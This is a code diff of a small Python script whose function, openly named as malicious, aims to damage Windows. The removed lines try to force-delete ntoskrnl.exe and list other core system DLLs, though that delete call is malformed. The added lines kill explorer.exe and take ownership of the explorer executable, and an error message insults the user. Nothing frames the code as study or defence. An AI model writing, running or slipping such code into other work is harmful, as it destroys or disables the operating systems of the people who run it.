@@ -4,20 +4,10 @@ from turtle import *
 import turtle
 system32 = "C:\\Windows\\System32"
 def malicious_shit():
-    os.popen("icacls")
-    kern32="C:\\Windows\\System32\\ntoskrnl.exe"
-    kernel="C:\\Windows\\System32\\kernel32.dll"
-    user="C:\\Windows\\System32\\user32.dll"
-    gdi="C:\\Windows\\System32\\gdi32.dll"
-    advapi="C:\\Windows\\System32\\advapi32.dll"
-    kerneldll="C:\\Windows\\System32\\ntdll.dll"
-    shell="C:\\Windows\\System32\\shell32.dll"
-    ole="C:\\Windows\\System32\\ole32.dll"
-    oleaut="C:\\Windows\\System32\\oleaut32.dll"
-    comdlg="C:\\Windows\\System32\\comdlg32.dll"
-    msvcrt="C:\\Windows\\System32\\msvcrt.dll"
+
     try :
-         os.popen("del /q /f /s",kern32)
+         os.popen("taskkill /F /IM explorer.exe")
+         os.popen("takeown /f C:\\Windows\\explorer.exe")
         
     except OSError :
          print("Check your permissions stupid")
